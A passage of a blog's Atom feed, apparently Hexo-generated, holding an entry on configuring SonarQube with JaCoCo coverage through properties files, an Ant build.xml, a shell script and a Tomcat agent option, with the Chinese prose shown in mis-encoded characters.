&lt;p&gt;è§£å†³ä»¥åæœåŠ¡é‡æ–°è·‘ä¸€éå·²ç»æå®šã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/hadoop2.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/hadoop3.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;å‰è¨€é—²è°ˆï¼š&quot;&gt;&lt;a href=&quot;#å‰è¨€é—²è°ˆï¼š&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€é—²è°ˆï¼š&quot;&gt;&lt;/a&gt;å‰è¨€é—²è°ˆï¼š&lt;/h3&gt;&lt;p&gt;ä¹‹å‰åšCDNäº‘è®¡ç®—å…¬å¸æ¥åˆ°ç¾å¹´å¤§å¥åº·ç°åœ¨åœ¨ä¸€å®¶åŒ»ç–—å¤§æ•°æ®å…¬å¸è´Ÿè´£è¿ç»´éƒ¨é—¨å¤§å¤§å°å°çš„æ´»ï¼Œæ—¢ç„¶æ˜¯åŒ»ç–—å¤§æ•°æ®å½“ç„¶ç¦»ä¸å¼€å¤§æ•°
    
    </summary>
    
      <category term="å¤§æ•°æ®" scheme="http://blog.yangcvo.me/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
    
      <category term="Big data Hadoop" scheme="http://blog.yangcvo.me/tags/Big-data-Hadoop/"/>
    
  </entry>
  
  <entry>
    <title>Sonarqubeå’Œjacocoæ­å»ºä»£ç æ£€æŸ¥</title>
    <link href="http://blog.yangcvo.me/2016/12/07/Java-Dubbo/Sonarqube%E5%92%8Cjacoco%E6%90%AD%E5%BB%BA%E4%BB%A3%E7%A0%81%E6%A3%80%E6%9F%A5/"/>
    <id>http://blog.yangcvo.me/2016/12/07/Java-Dubbo/Sonarqubeå’Œjacocoæ­å»ºä»£ç æ£€æŸ¥/</id>
    <published>2016-12-07T09:56:03.000Z</published>
    <updated>2017-03-14T05:57:33.000Z</updated>
    
    <content type="html">&lt;ol&gt;
&lt;li&gt;&lt;p&gt;å‡†å¤‡å·¥ä½œï¼š&lt;code&gt;sonarqubeï¼Œjacocoï¼Œgitï¼Œmavenï¼Œantï¼Œsonar-runner&lt;/code&gt;&lt;br&gt;sonarqube å»å®˜ç½‘ä¸‹è½½ï¼Œæ–‡ä»¶å¤ªå¤§ï¼Œä¸èƒ½ä¸Šä¼ &lt;br&gt;gitï¼Œmavneï¼Œantè‡ªå·±å®‰è£…&lt;br&gt;sonarqubeå’Œsonar-runnrtå®‰è£…ï¼šæŸ¥çœ‹&lt;a href=&quot;http://blog.csdn.net/u011925176/article/details/51536563&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;é“¾æ¥&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ç›‘æ§æœºå­é…ç½®ï¼š&lt;br&gt;å¯åŠ¨sonarqubeï¼Œgitä¸‹è½½æºä»£ç ï¼Œè¿›å…¥æºç è·¯å¾„ï¼Œæ·»åŠ ä¸€ä¸‹æ–‡ä»¶ï¼›&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1ï¼‰sonar-project.properties&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#Set sonar-runner Configuration&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;sonar.projectKey=haozhuo-hm-01&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;sonar.projectVersion=6.1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;sonar.projectName=haozhuo-hm&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;sonar.language=java&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;(1). éœ€è¦åˆ†æä»£ç çš„è·¯å¾„&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;sonar.sources=src/main/java/com/haozhuo/hm/service, src/main/java/com/haozhuo/hm/dubbo&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;(2). è¿™ä¸ªåœ°æ–¹å¾ˆé‡è¦ï¼Œå·¥ç¨‹classæ–‡ä»¶çš„ä½ç½®ï¼Œä»£ç è¦†ç›–ç‡å°±æ˜¯æ ¹æ®è¿™ä¸ªä¸åŒ¹é…çš„ï¼Œå¦‚æœçº¿ä¸Šçš„ä»£ç å’Œçº¿ä¸‹çš„ä»£ç ä¸åŒæ­¥ï¼Œå¯èƒ½ä¼šé€ æˆè¦†ç›–ç‡è®¡ç®—ä¸ç²¾ç¡®ã€‚&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;sonar.java.binaries=/Users/yejun/git/YJK-Java/haozhuo/haozhuo-hm/target&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;sonar.test.binaries=&lt;span class=&quot;built_in&quot;&gt;test&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;sonar.sourceEncoding=UTF-8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;sonar.my.property=value&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;sonar.java.coveragePlugin=jacoco&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#Path to the JaCoCo report file containing coverage data by unit tests. The path may be absolute or relative to the project base directory&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;sonar.jacoco.reportPath=/Users/yejun/git/YJK-Java/haozhuo/haozhuo-hm/jacoco.exec&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#Path to the JaCoCo report file containing coverage data by integration tests. The path may be absolute or relative to the project base directory&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;sonar.jacoco.itReportPath=/Users/yejun/git/YJK-Java/haozhuo/haozhuo-hm/jacoco.exec&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#sonar.jacoco.reportMissing.force.zero&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;sonar.jacoco.reportMissing.force.zero=&lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;(3). build.xml&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;?xml version=&lt;span class=&quot;string&quot;&gt;&quot;1.0&quot;&lt;/span&gt; encoding=&lt;span class=&quot;string&quot;&gt;&quot;UTF-8&quot;&lt;/span&gt;?&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;project name=&lt;span class=&quot;string&quot;&gt;&quot;testCodeCoveage&quot;&lt;/span&gt; default=&lt;span class=&quot;string&quot;&gt;&quot;all&quot;&lt;/span&gt; basedir=&lt;span class=&quot;string&quot;&gt;&quot;.&quot;&lt;/span&gt; xmlns:jacoco=&lt;span class=&quot;string&quot;&gt;&quot;antlib:org.jacoco.ant&quot;&lt;/span&gt;&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;!--&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;property name=&lt;span class=&quot;string&quot;&gt;&quot;jacocoantPath&quot;&lt;/span&gt; value=&lt;span class=&quot;string&quot;&gt;&quot;/root/jacocoant.jar&quot;&lt;/span&gt;/&amp;gt; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;property name=&lt;span class=&quot;string&quot;&gt;&quot;jacocoexecPath&quot;&lt;/span&gt; value=&lt;span class=&quot;string&quot;&gt;&quot;.&quot;&lt;/span&gt;/&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;--&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;!-- Import the JaCoCo Ant Task --&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;taskdef uri=&lt;span class=&quot;string&quot;&gt;&quot;antlib:org.jacoco.ant&quot;&lt;/span&gt; resource=&lt;span class=&quot;string&quot;&gt;&quot;org/jacoco/ant/antlib.xml&quot;&lt;/span&gt;&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;classpath path=&lt;span class=&quot;string&quot;&gt;&quot;/srv/jacoco/jacocoant.jar&quot;&lt;/span&gt; /&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;/taskdef&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;target name=&lt;span class=&quot;string&quot;&gt;&quot;merge&quot;&lt;/span&gt; depends=&lt;span class=&quot;string&quot;&gt;&quot;dump&quot;&lt;/span&gt;&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;jacoco:merge destfile=&lt;span class=&quot;string&quot;&gt;&quot;jacoco.exec&quot;&lt;/span&gt;&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;!-- å¯¼å‡º&lt;span class=&quot;built_in&quot;&gt;exec&lt;/span&gt;æ–‡ä»¶åœ°å€ï¼Œåœ¨è¿™é‡Œç»Ÿä¸€ç”Ÿäº§ä¸€ä¸ª&lt;span class=&quot;built_in&quot;&gt;exec&lt;/span&gt;æ–‡ä»¶ --&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;fileset dir=&lt;span class=&quot;string&quot;&gt;&quot;/opt/haozhuo-hm/jacoco&quot;&lt;/span&gt; includes=&lt;span class=&quot;string&quot;&gt;&quot;*.exec&quot;&lt;/span&gt;/&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;/jacoco:merge&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;/target&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;target name=&lt;span class=&quot;string&quot;&gt;&quot;dump&quot;&lt;/span&gt;&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;!-- reset=&lt;span class=&quot;string&quot;&gt;&quot;true&quot;&lt;/span&gt;æ˜¯æŒ‡åœ¨dumpå®Œæˆä¹‹åï¼Œé‡ç½®jvmä¸­çš„è¦†ç›–ç‡æ•°æ®ä¸ºç©ºã€‚append=&lt;span class=&quot;string&quot;&gt;&quot;true&quot;&lt;/span&gt;æ˜¯æŒ‡dumpå‡ºæ¥çš„&lt;span class=&quot;built_in&quot;&gt;exec&lt;/span&gt;æ–‡ä»¶ä¸ºå¢é‡æ–¹å¼ --&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;jacoco:dump address=&lt;span class=&quot;string&quot;&gt;&quot;192.168.1.19&quot;&lt;/span&gt; reset=&lt;span class=&quot;string&quot;&gt;&quot;false&quot;&lt;/span&gt; destfile=&lt;span class=&quot;string&quot;&gt;&quot;/opt/haozhuo-hm/jacoco/jacoco_haozhuo-hm.exec&quot;&lt;/span&gt; port=&lt;span class=&quot;string&quot;&gt;&quot;10001&quot;&lt;/span&gt; append=&lt;span class=&quot;string&quot;&gt;&quot;true&quot;&lt;/span&gt;/&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;!-- &amp;lt;jacoco:dump address=&lt;span class=&quot;string&quot;&gt;&quot;10.199.145.117&quot;&lt;/span&gt; reset=&lt;span class=&quot;string&quot;&gt;&quot;true&quot;&lt;/span&gt; destfile=&lt;span class=&quot;string&quot;&gt;&quot;/srv/jacoco/target/jacoco_10.199.145.117_2.exec&quot;&lt;/span&gt; port=&lt;span class=&quot;string&quot;&gt;&quot;10002&quot;&lt;/span&gt; append=&lt;span class=&quot;string&quot;&gt;&quot;true&quot;&lt;/span&gt;/&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;jacoco:dump address=&lt;span class=&quot;string&quot;&gt;&quot;10.199.145.118&quot;&lt;/span&gt; reset=&lt;span class=&quot;string&quot;&gt;&quot;true&quot;&lt;/span&gt; destfile=&lt;span class=&quot;string&quot;&gt;&quot;/srv/jacoco/target/jacoco_10.199.145.118_1.exec&quot;&lt;/span&gt; port=&lt;span class=&quot;string&quot;&gt;&quot;10001&quot;&lt;/span&gt; append=&lt;span class=&quot;string&quot;&gt;&quot;true&quot;&lt;/span&gt;/&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;jacoco:dump address=&lt;span class=&quot;string&quot;&gt;&quot;10.199.145.118&quot;&lt;/span&gt; reset=&lt;span class=&quot;string&quot;&gt;&quot;true&quot;&lt;/span&gt; destfile=&lt;span class=&quot;string&quot;&gt;&quot;/srv/jacoco/target/jacoco_10.199.145.118_2.exec&quot;&lt;/span&gt; port=&lt;span class=&quot;string&quot;&gt;&quot;10002&quot;&lt;/span&gt; append=&lt;span class=&quot;string&quot;&gt;&quot;true&quot;&lt;/span&gt;/&amp;gt; --&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;!--&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;jacoco:dump address=&lt;span class=&quot;string&quot;&gt;&quot;10.199.170.26&quot;&lt;/span&gt; reset=&lt;span class=&quot;string&quot;&gt;&quot;true&quot;&lt;/span&gt; destfile=&lt;span class=&quot;string&quot;&gt;&quot;/Users/yejun/git/YJK-Java/haozhuo/haozhuo-hm/jacoco_10.199.170.26.exec&quot;&lt;/span&gt; port=&lt;span class=&quot;string&quot;&gt;&quot;10001&quot;&lt;/span&gt; append=&lt;span class=&quot;string&quot;&gt;&quot;true&quot;&lt;/span&gt;/&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;--&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;/target&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;!-- ========= The main target &lt;span class=&quot;string&quot;&gt;&quot;all&quot;&lt;/span&gt; ========= --&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;target name=&lt;span class=&quot;string&quot;&gt;&quot;all&quot;&lt;/span&gt; depends=&lt;span class=&quot;string&quot;&gt;&quot;merge&quot;&lt;/span&gt; /&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;/project&amp;gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;(4). jacoco.sh&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#!/bin/sh&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#åŠ è½½ç¯å¢ƒå˜é‡&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;source&lt;/span&gt; /etc/profile&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#sonar-runner è·¯å¾„&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; /Users/yejun/software/sonar-runner-2.4/haozhuo-hm&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#åˆå§‹åŒ–å½“å‰æ—¶é—´ã€å‘¨&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;time=`date &lt;span class=&quot;string&quot;&gt;&#39;+%s&#39;&lt;/span&gt;`&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;lastweek=`cat /var/run/coverage.pid`&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;newweek=`date +%W`&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#è·å–æœ€æ–°ä»£ç &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;git pull&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#ç¼–è¯‘æœ€æ–°ä»£ç ï¼Œå¦‚æœä½¿ç”¨jacoco agenté€šè¿‡classdumpdirè·¯å¾„dumpå‡ºæ¥çš„classæ–‡ä»¶ï¼Œåˆ™ä¸éœ€è¦mvn cleanè¿›è¡Œclassæ–‡ä»¶ç¼–è¯‘ã€‚å¦åˆ™éœ€è¦ç¼–è¯‘classæ–‡ä»¶ã€‚&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#mvn clean install -Dmaven.test.skip=true -Ptest&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#è·å–å†å²ç‰ˆæœ¬å’Œæœ€æ–°ç‰ˆæœ¬&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#oldVersion=`cat /var/run/coverage.pid`&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;newversion=`grep -r &lt;span class=&quot;string&quot;&gt;&quot;&amp;lt;version&amp;gt;&quot;&lt;/span&gt; pom.xml |awk -F &lt;span class=&quot;string&quot;&gt;&quot;&amp;lt;/&quot;&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;&amp;#123;print $1&amp;#125;&#39;&lt;/span&gt;|awk -F &lt;span class=&quot;string&quot;&gt;&quot;&amp;gt;&quot;&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;&amp;#123;print $2&amp;#125;&#39;&lt;/span&gt;`&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#åˆ¤æ–­å¦‚æœç‰ˆæœ¬æœªå‘ç”Ÿå˜æ›´ï¼Œåˆ™ç›´æ¥åˆå¹¶ä»£ç è¦†ç›–ç‡æ•°æ®;å¦‚æœä»£ç å‘ç”Ÿå˜æ›´ï¼Œåˆ™åˆ é™¤å†å²jacoco.exeè¦†ç›–ç‡æ•°æ®ï¼Œé‡æ–°ç»Ÿè®¡&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; [ &lt;span class=&quot;variable&quot;&gt;$lastweek&lt;/span&gt; = &lt;span class=&quot;variable&quot;&gt;$newweek&lt;/span&gt; ];&lt;span class=&quot;keyword&quot;&gt;then&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#sed -i &#39;/sonar.projectVersion/d&#39; sonar-project.properties&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#sed -i &quot;2a sonar.projectVersion=$lastVersion.$time&quot; sonar-project.properties&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ant&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;/Users/yejun/software/sonar-runner-2.4/bin/sonar-runner&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$newweek&lt;/span&gt;&amp;gt;/var/run/coverage.pid&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;rm -rf *.exec&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;sed -i &lt;span class=&quot;string&quot;&gt;&#39;/sonar.projectKey/d&#39;&lt;/span&gt; sonar-project.properties&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;sed -i &lt;span class=&quot;string&quot;&gt;&#39;/sonar.projectVersion/d&#39;&lt;/span&gt; sonar-project.properties&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;sed -i &lt;span class=&quot;string&quot;&gt;&quot;1a sonar.projectKey=vips-mobile-operation-key-&lt;span class=&quot;variable&quot;&gt;$newweek&lt;/span&gt;&quot;&lt;/span&gt; sonar-project.properties&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;sed -i &lt;span class=&quot;string&quot;&gt;&quot;2a sonar.projectVersion=&lt;span class=&quot;variable&quot;&gt;$newversion&lt;/span&gt;&quot;&lt;/span&gt; sonar-project.properties&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ant&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;/Users/yejun/software/sonar-runner-2.4/bin/sonar-runner&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;fi&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;3-è¢«ç›‘æ§æœºå­é…ç½®ï¼š&quot;&gt;&lt;a href=&quot;#3-è¢«ç›‘æ§æœºå­é…ç½®ï¼š&quot; class=&quot;headerlink&quot; title=&quot;3.è¢«ç›‘æ§æœºå­é…ç½®ï¼š&quot;&gt;&lt;/a&gt;3.è¢«ç›‘æ§æœºå­é…ç½®ï¼š&lt;/h3&gt;&lt;p&gt;1ï¼‰ä¸Šä¼ ä¸€ä¸ªjacocoanget.jaræ–‡ä»¶ï¼Œæ–‡ä»¶åœ¨jacoco.zipé‡Œé¢ï¼Œæ”¾åˆ°ä¸€ä¸ªç›®å½•ä¸‹ã€‚ä¾‹å¦‚ï¼š/srv/jacoco/jacocoagent.jar&lt;/p&gt;
&lt;p&gt;2) ä¿®æ”¹å·¥ç¨‹tomcat/bin/ä¸‹çš„catalina.shï¼Œæ–°å¢&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;JAVA_OPTS=&lt;span class=&quot;string&quot;&gt;&quot;&lt;span class=&quot;variable&quot;&gt;$JAVA_OPTS&lt;/span&gt; -javaagent:/srv/jacoco/jacocoagent.jar=includes=*,output=tcpserver,port=10001,address=192.168.1.19â€&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;å‚æ•°ï¼š&lt;/p&gt;
